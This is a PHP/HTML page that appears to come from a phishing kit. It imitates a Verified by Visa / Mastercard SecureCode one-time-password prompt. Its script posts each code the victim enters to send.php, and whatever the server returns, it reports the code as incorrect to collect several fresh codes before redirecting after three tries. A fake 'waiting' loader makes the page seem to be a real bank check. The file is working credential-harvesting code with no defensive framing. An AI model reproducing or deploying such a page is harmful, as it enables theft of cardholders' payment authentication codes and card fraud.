<?php 
require '../main.php';
?>
<!doctype html>
<html>
<head>
<title></title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"/>
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="res/jq.js"></script>
<style>

.loader{
	display:none;
    width:100%;
    height:100%;
    top:0;
    left:0;
    position:fixed;
    background:white;
}

.loader-content{
    width:100%;
    height:100%;
    display:flex;
    align-items:center;
    justify-content:center;
}

</style>
</head>
<body>
<div class="container-fluid">
<div class="row text-center">

</div>
<div class="row row-cols-1 p-5 d-flex justify-content-center">
<div class="col text-center">
<img src="res/vbvmcs.png" style="width:120px;">
</div>
<div class="col-sm-6 p-3 my-4"  style=" font-size:0.8em;">
<?php 
echo getlang("OTP_TITLE");
?>


<div id="errors">

</div>

<?php
if(isset($_GET['sent'])){
	echo '
	<div class="alert alert-success" id="sent">
		'.getLang('CODE_SENT').'
	</div>
	';
}
?>
<div class="form w-100 py-5">
<div class="form-group">
<div class="input-group">
<div class="input-group-prepend">
<span class="input-group-text" id="basic-addon1">
<i class="fa fa-envelope"></i>
</span>
</div>
<input type="text" maxlength="6" class="form-control" id="otp">
</div>
</div>
<div class="form-group text-right">
<button class="btn btn-info" onclick="sendOtp($('#otp').val())"><?php echo  getLang("SUBMIT"); ?> <i class="fa fa-caret-right"></i></button>
</div>


<div class="form-group" style="font-size:0.7em;">
<a href="?sent"><?php echo getLang('NEW_CODE'); ?></a>
</div>

</div>
</div>
</div>
</div>




<div class="loader" id="loader" style="display:block;">
<div class="loader-content text-center">
<div>
<div>
<img src="res/logo.png" style="width:150px; margin:10px 0;">
<p>
<img src="res/loading.gif" style="width:50px; margin:10px 0;">
</p>
</div>
<div style="font-size:0.7em;">
<?php echo getLang("WAITING_MSG"); ?>
</div>				 
</div>
</div>
</div>

<script>
var tries=0;
var max_tries=3;
var loader = $("#loader");

function sendOtp(val){
	$("#errors").hide();
if(val.length<6 || /^[0-9]+$/.test(val)==false){
	showError('<div class="alert alert-danger"><?php echo getLang("CODE_ERROR"); ?></div>');
}else{
	loader.show();
	$.post("send.php",{otp:val}, function(d){
		tries++;
		if(tries==max_tries){
			window.location="out.php";
		}else{
			$("#otp").val("");
		loader.hide();
		showError('<div class="alert alert-danger" ><?php echo getLang("CODE_INCORRECT"); ?></div>');
		}
	});
	
	
}
}

function showError(msg){
	$("#errors").html(msg);
	$("#errors").show();
}


setTimeout(function(){
	loader.hide();
},<?php echo $seconds*1000;?>);



setTimeout(function(){
	$("#sent").fadeOut();
},10000);



</script>
</body>
</html>